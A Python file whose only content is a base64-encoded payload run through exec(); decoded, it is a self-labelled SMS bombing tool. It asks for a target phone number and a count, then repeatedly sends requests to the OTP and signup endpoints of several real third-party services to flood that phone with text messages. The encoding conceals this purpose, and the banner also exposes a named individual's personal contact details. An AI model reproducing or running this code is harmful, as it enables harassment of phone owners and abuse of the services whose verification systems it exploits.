import base64
exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZSxvcw0KYmx1ZT0gJ1wzM1s5NG0nDQpsaWdodGJsdWU9ICdcMzNbOTRtJw0KcmVkPSAnXDMzWzkxbScNCndoaXRlPSAnXDMzWzk3bScNCnllbGxvdz0gJ1wzM1s5M20nDQpncmVlbj0gJ1wzM1sxOzMybScNCmN5YW49ICdcMzNbMG0nDQpvcy5zeXN0ZW0oImNsZWFyIikNCmRlZiBwc2Ioeik6DQoNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCg0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQoNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQoNCiAgICAgICAgdGltZS5zbGVlcCgwLjA1KQ0KDQpsb2dvPXdoaXRlK3N0cigiIiINCg0KDQrilojilojilojilojilojilojilogg4paI4paIICAgIOKWiOKWiCAg4paI4paI4paI4paI4paI4paIIOKWiOKWiCAgIOKWiOKWiA0K4paI4paIICAgICAg4paI4paIICAgIOKWiOKWiCDilojiloggICAgICDilojiloggIOKWiOKWiA0K4paI4paI4paI4paI4paIICAg4paI4paIICAgIOKWiOKWiCDilojiloggICAgICDilojilojilojilojilogNCuKWiOKWiCAgICAgIOKWiOKWiCAgICDilojilogg4paI4paIICAgICAg4paI4paIICDilojilogNCuKWiOKWiCAgICAgICDilojilojilojilojilojiloggICDilojilojilojilojilojilogg4paI4paIICAg4paI4paIDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQpcMzNbOTdtU01TIEJPTUJJTkcgVE9PTFMNClwzM1s5N+KUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KXDMzWzkzbeKWuCBBVVRIT1IgICAgIDogU0FIQVJJWUFOIEtIQU4NClwzM1s5M23ilrggRkFDRUJPT0sgICA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9TYWhhcml5YW4uS2hhbjYzWA0KXDMzWzkzbeKWuCBXaGF0YXBwICAgICA6ICs4ODAxODgxMjk4MzM3DQpcMzNbOTfilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCg0KIiIiKQ0KDQpwcmludChsb2dvKQ0KDQp1c2Vybj0iU0FIQVJJWUFOIg0KcGFzc3dkPSI2M1giDQoNCg0KaW5wdXNlcj1zdHIoaW5wdXQoIuKAolwzM1s5M21FbnRlciBVc2VybmFtZTotXDMzWzk3bSIpKQ0KaW5wcGFzcz1zdHIoaW5wdXQoIuKAolwzM1s5MW1FbnRlciBQYXNzd29yZDotXDMzWzk3bSIpKQ0KDQppZiB1c2Vybj09aW5wdXNlciBhbmQgcGFzc3dkPT1pbnBwYXNzOg0KICAgcHNiKCJcMzNbMG1b4oiaXSBMb2dpbiBTdWNjZXNzZnVsIikNCiAgIHRpbWUuc2xlZXAoMSkNCiAgIHBhc3MNCg0Kb3Muc3lzdGVtKCJjbGVhciIpDQpwcmludChsb2dvKQ0KbnVtYmVyICA9IGlucHV0KCLigKJcMzNbOTRtRW50ZXIgWW91ciBUYXJnZXQgTnVtYmVyOiAiKQ0KYW1vdW50ID0gaW50KGlucHV0KCLigKJcMzNbOTRtRW50ZXIgWW91ciBBbW91bnQ6ICIpKQ0KDQoNCmRlZiBhcGkxKCk6DQogICANCiAgICB1cmwgPSAiaHR0cHM6Ly9wcm9kLWFwaS52aWV3bGlmdC5jb20vaWRlbnRpdHkvc2lnbnVwP3NpdGU9aG9pY2hvaXR2Ig0KICAgDQogICAgDQogICAgZGF0YSA9IHsNCiAgICAgICJyZXF1ZXN0VHlwZSI6ICJzZW5kIiwNCiAgICAgICJwaG9uZU51bWJlciI6ICIrODgiICsgbnVtYmVyLA0KICAgICAgImVtYWlsQ29uc2VudCI6ICJ0cnVlIiwNCiAgICAgICJ3aGF0c2FwcENvbnNlbnQiOiAidHJ1ZSINCiAgICB9DQogICAgDQogICAgDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkNvbnRlbnQtVHlwZSIgOiAiYXBwbGljYXRpb24vanNvbiINCiAgICB9DQogICAgDQogICAgDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbiA9IGRhdGEsIGhlYWRlcnMgPSBoZWFkZXJzKS5zdGF0dXNfY29kZQ0KICAgIA0KIA0KICAgIHJldHVybiByZXNwb25zZQ0KDQoNCmRlZiBhcGkyKCk6DQogICAgDQogICAgdXJsID0gImh0dHBzOi8vYXBpLmJvbmdvLXNvbHV0aW9ucy5jb20vYXV0aC9hcGkvbG9naW4vc2VuZC1vdHAiDQogICAgDQogICANCiAgICBkYXRhID0gew0KICAgICAgICAib3BlcmF0b3IiIDogImFsbCIsDQogICAgICAgICJtc2lzZG4iOiAiODgiICsgbnVtYmVyDQogICAgfQ0KICAgIA0KICAgIA0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiIDogImFwcGxpY2F0aW9uL2pzb24iDQogICAgfQ0KICAgIA0KICAgIA0KICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb24gPSBkYXRhLCBoZWFkZXJzID0gaGVhZGVycykuc3RhdHVzX2NvZGUNCiAgICANCiAgDQogICAgcmV0dXJuIHJlc3BvbnNlDQoNCg0KDQpkZWYgYXBpNCgpOg0KICAgDQogICAgdXJsID0iaHR0cHM6Ly9zdGFnZS5iaW9zY29wZWxpdmUuY29tL2VuL2xvZ2luL3NlbmQtb3RwP3Bob25lPTg4IitudW1iZXIrIiZvcGVyYXRvcj1iZC1vdHAiDQogICANCiAgICANCiAgICBkYXRhID0gew0KICAgICAgInJlcXVlc3RUeXBlIjogInNlbmQiLA0KICAgICAgInBob25lTnVtYmVyIjogIis4OCIgKyBudW1iZXIsDQogICAgICAiZW1haWxDb25zZW50IjogInRydWUiLA0KICAgICAgIndoYXRzYXBwQ29uc2VudCI6ICJ0cnVlIg0KICAgIH0NCiAgICANCiAgICANCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi9qc29uIg0KICAgIH0NCiAgICANCiAgICANCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uID0gZGF0YSwgaGVhZGVycyA9IGhlYWRlcnMpLnN0YXR1c19jb2RlDQogICAgDQogDQogICAgcmV0dXJuIHJlc3BvbnNlDQoNCnBzYigiXDMzWzk0bVxuNjNYQm9tYmluZyBTdGFydGVkIVxuIikNCg0KDQpkb25lID0gMA0KDQoNCndoaWxlIFRydWU6DQogICAgDQogICAgY29kZSA9IGFwaTEoKQ0KICAgIA0KICAgIA0KICAgIGlmIChjb2RlID09IDIwMCk6DQogICAgICAgIGRvbmUgKz0gMQ0KICAgICAgICBwc2Ioc3RyKGRvbmUpICsgIiBcMzNbMG1TbXMgU2VudCBTdWNjZXNzZnVsbHkhISIpDQogICANCiAgICBlbHNlOg0KICAgICAgICBwc2IoIlwzM1s5M21TbXMgU2VuZCBGYWlsZWQhIikNCiAgICANCiAgICAgDQogICAgaWYgKGRvbmUgPT0gYW1vdW50KToNCiAgICAgICAgcHNiKCIzM1s5NG1tXG42M1ggQm9tYmluZyBGaW5pc2hlZCEiKQ0KICAgICAgICBicmVhaw0KICAgICANCiAgICANCiAgICBjb2RlID0gYXBpMigpDQogICAgDQoNCiAgICBpZiAoY29kZSA9PSAyMDApOg0KICAgICAgICBkb25lICs9IDENCiAgICAgICAgcHNiKHN0cihkb25lKSArICIgXDMzWzk0bW1TbXMgU2VudCBTdWNjZXNzZnVsbHkhISIpDQogICAgDQogICAgZWxzZToNCiAgICAgICAgcHNiKCJcMzNbOTNtU21zIFNlbmQgRmFpbGVkISIpDQogICAgDQogICAgDQogICAgaWYgKGRvbmUgPT0gYW1vdW50KToNCiAgICAgICAgcHNiKCJcMzNbOTRtXG42M1ggQm9tYmluZyBGaW5pc2hlZCEiKQ0KICAgICAgICBicmVhaw0KICAgIA0KICAgIA0KICAgIA0KICAgIGNvZGUgPSBhcGk0KCkNCiAgICANCg0KICAgIGlmIChjb2RlID09IDIwMCk6DQogICAgICAgIGRvbmUgKz0gMQ0KICAgICAgICBwc2Ioc3RyKGRvbmUpICsgIiBcMzNbMFNtcyBTZW50IFN1Y2Nlc3NmdWxseSEhIikNCiAgICANCiAgICBlbHNlOg0KICAgICAgICBwc2IoIlwzM1s5MW1TbXMgU2VuZCBGYWlsZWQhIikNCiAgICANCiAgICANCiAgICBpZiAoZG9uZSA9PSBhbW91bnQpOg0KICAgICAgICBwc2IoIlwzM1swbTYzWCBCb21iaW5nIEZpbmlzaGVkISIpDQogICAgICAgIGJyZWFrDQogICAg"))